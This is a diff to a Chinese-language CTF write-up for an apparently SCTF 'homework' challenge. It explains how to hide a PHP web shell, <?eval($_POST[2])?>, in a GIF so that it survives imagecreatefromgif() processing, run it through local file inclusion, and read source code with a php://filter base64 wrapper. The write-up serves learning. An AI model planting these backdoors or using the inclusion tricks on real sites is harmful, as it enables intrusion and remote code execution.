@@ -95,7 +95,16 @@
 想到这个知识点：https://www.secgeek.net/bookfresh-vulnerability/     
 先尝试了jpg、png、gif格式的图片，发现只有gif可以，接下来如何构造自己嵌入了php代码的gif图片呢？   
 文章中提到的方法是：取gif图片，经过createimagefromgif()后得到处理后的图片，将前图与后图对比，找到没有被替换的data，然后把这部分替换成自己需要的PHP代码：<?eval($_POST[2])?> 留作后门   
-上传成功后在网页上输出经过处理后的和自己上传的那张一模一样的图片，在当前目录下查看这张图片: homework.sctf.xctf.org.cn/homework.php?homework=./1305771078.gif
+上传成功后在网页上输出经过处理后的和自己上传的那张一模一样的图片，在当前目录下查看这张图片: homework.sctf.xctf.org.cn/homework.php?homework=./upload/1305771078.gif或者homework.sctf.xctf.org.cn/homework.php?homework=upload/1305771078.gif
 网页上出现一堆怪异的字符，然后留的后门就有用啦  
 推荐firefox下一个非常好用的插件hackbar  
-[图片](img/1.png)
+![图片1](img/1.png)  
+![图片2](img/2.png)  
+![图片3](img/3.png)  
+
+###收获总结  
+1.  在某些情况下使用php://filter/read=convert.base64-encode/resource=方法查看php源代码  
+ 问：在什么情况下可以这么干呢  
+ 当这个某个url中有参数时，即get文件时，可以将参数值替换成php://filter/read=convert.base64-encode/resource=想要的.php,本来是要get到页面所指定的文件，但由于我们的替换和原本代码的不安全，使得有些情况下可以成功的读到php源代码*^_^* 
+2.  get到一个php中不安全的函数imagecreatefromgif()
+ 相应的解决办法：取gif图片，经过createimagefromgif()后得到处理后的图片，将前图与后图对比，找到没有被替换的data，然后把这部分替换成自己需要的PHP代码：<?eval($_POST[2])?>（你想要实现的语句）
